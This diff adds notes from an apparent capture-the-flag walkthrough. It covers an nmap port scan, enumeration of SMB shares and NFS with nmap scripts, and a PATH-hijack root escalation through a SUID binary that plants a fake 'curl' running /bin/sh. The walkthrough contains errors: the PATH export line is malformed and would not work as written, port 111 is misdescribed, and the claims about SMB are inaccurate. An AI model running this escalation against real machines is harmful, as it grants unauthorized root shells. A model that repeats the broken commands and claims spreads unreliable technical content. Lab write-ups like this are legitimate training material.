@@ -1,0 +1,48 @@
+1 ~ Scan the machine.
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+2049/tcp open  nfs
+
+```ANS: 7 ports are open ```
+
+2 ~ Enumerating samba shares.
+With `smbmap` or ``nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.149.207``
+
+Samba is the standard Windows interoperability suite of programs for Linux and Unix. 
+It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. 
+Its often referred to as a network file system.
+
+Samba is based on the common client/server protocol of Server Message Block (SMB). 
+SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.
+
+
+3 ~ In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.
+
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.149.207
+
+
+3 ~ After logging in, we need to abuse suid binary file which is /usr/bin/menu
+
+Strings is a command on Linux that looks for human readable strings on a binary.
+This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).
+
+As this file runs as the root users privileges, we can manipulate our path gain a root shell.
+
+To enumerate,used this code:
+
+
+
+```
+cd /tmp
+echo /bin/sh > curl
+chmod 777 curl
+export PATH=/tmp/$PATH
+
+
+
+```
